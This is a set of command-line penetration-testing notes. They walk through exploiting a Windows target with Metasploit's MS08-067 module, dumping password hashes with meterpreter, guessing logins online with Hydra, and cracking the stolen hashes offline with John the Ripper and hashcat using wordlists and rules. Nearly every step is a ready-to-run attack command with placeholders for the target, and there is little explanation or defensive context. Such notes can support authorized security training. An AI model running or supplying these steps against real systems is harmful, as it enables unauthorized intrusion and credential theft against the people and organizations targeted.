============================== Grabbing Hashed Password From Target  ======================================

-grabbing hashed passwords from the user to crack the passwords offline
-this is more effective then online password cracking as offline cracking goes unnoticed

service postgresql start ---> start up the postgresql server, Metasploit uses PostgreSQL as its database so it needs to be launched first
service metasploit start --->  start up metasploit
msfconsole   ---> runs the program

msf > use exploit/windows/smb/ms08_067_netapi		---> using ms08-067 vulnerability
msf > show options
msf > set RHOST [IPAddress]
msf > exploit

meterpreter > hashdump	---> dump out password hashes if you have access to sufficient privileges, a meterpreter shell must be on the system
---From here the password hashes can be grabbed and saved to a file for cracking

============================== Grabbing Hashed Password From Target  ======================================

============================== Online Password Cracking  ======================================

Program:
Hydra

cons:
-noisey
-more noticeable, easier chance to get ip blocked

Example:
hydra -l [Username]	-p [PassWord]	---> '-l' one user name
hydra -L [Username] -p [PassWord]	---> '-L' list of usernames (textfile.txt, etc...)
hydra -l [Username] -p [PassWord]	---> '-p' one password
hydra -l [Username] -P [PassWord]	---> '-P' list of passwords (textfile.txt, etc...)
hydra	--->to see all protocols

hydra -l [Username] -P [PassWord] [TargetIPAddress] [Service]	----> Service such as 'ftp'

============================== Online Password Cracking  ======================================


============================== Offline Password Cracking  ======================================

 Program:
1. John the Ripper (john)
2. HashCat (oclhashcat)	---> stronger machines can use this
3. HashCat (hashcat)

-cracking password hashes
-LM Hash can be bruteforced

-----------------------------------------------------------------------------------------------

Example - John the Ripper to crack hash passwords grabbed from the target device:
john
john [ListOfHashedPasswords]		     ---> [ListOfHashedPasswords] can be a text file containing hashed passwords gathered
john --format=nt [ListOfHashedPasswords] --wordlist=[PasswordListKeywords]   ---> '--format=nt' used for cracking nt lm hash, [ListOfHashedPasswords] can be a text file along with [PasswordListKeywords]
john --show [ListOfHashedPasswords]	---> show password hashes cracked for given password list or file

Example 2 - John the Ripper to crack hash passwords grabbed from the target device:
john [ListOfHashedPasswords]	 --format=sha512crypt --wordlist=[PasswordListKeywords]   ---> '--format=nt' used for cracking nt lm hash, [ListOfHashedPasswords] can be a text file along with [PasswordListKeywords]
john --show [ListOfHashedPasswords]	---> show password hashes cracked for given password list or file


Grabbing the default wordlist for John the Ripper:
cd /usr/share/john/	---> change to directory to get default wordlist for password cracking
nano password.lst		--->Contains default password keylist that can be used with john the ripper
cd /root
john [ListOfHashedPasswords] --wordlist=/usr/share/john/password.lst --format=nt


Tool to get information on hashed passwords:
pipal [CrackedPasswords]
-----------------------------------------------------------------------------------------------

Example - HashCat to crack hash passwords grabbed from the target device:
hashcat --help	----> to check for all modes
hashcat -m 1000 [Hashes.txt] -o [CrackedPasswordsOutput.txt] [PathToWordList]	----> 1000 = NTLM, '-m' is mode


Example 2 - HashCat to crack hash passwords grabbed from the target device with RULES:
cd /usr/share/hashcat/rules/		---> Location of password cracking rules for hashcat (uppercase, lowercase checks etc...)
hashcat -m 1000 [Hashes.txt] -r /usr/share/hashcat/rules/best64.rule -o [CrackedPasswordsOutput.txt] [PathToWordList]	----> 1000 = NTLM, '-m' is mode


Cons to hashcat:
-The usernames stored in the hashed passwords text file need to be removed, or hashcat won't be able to crack it
-Only hash password files 

============================== Offline Password Cracking  ======================================
